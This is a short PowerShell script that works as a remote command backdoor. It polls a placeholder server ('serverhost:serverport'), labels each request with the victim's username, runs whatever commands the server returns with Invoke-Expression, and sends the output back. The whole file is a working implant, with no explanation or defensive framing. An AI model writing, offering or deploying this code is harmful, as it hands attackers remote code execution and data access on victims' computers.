$user = $env:username
while(1){
    $c = (irm  'http://serverhost:serverport/' -headers @{'vic' = $user})
    if (-not $?){
        break
    }
    if ($c){
    if ($c -eq "exit"){
        break
    }
    irm 'http://serverhost:serverport/' -method POST -Body (iex $c 2>&1 | Out-String -Width 9999)
    }else {irm 'http://serverhost:serverport/' -method POST -Body $c}
}
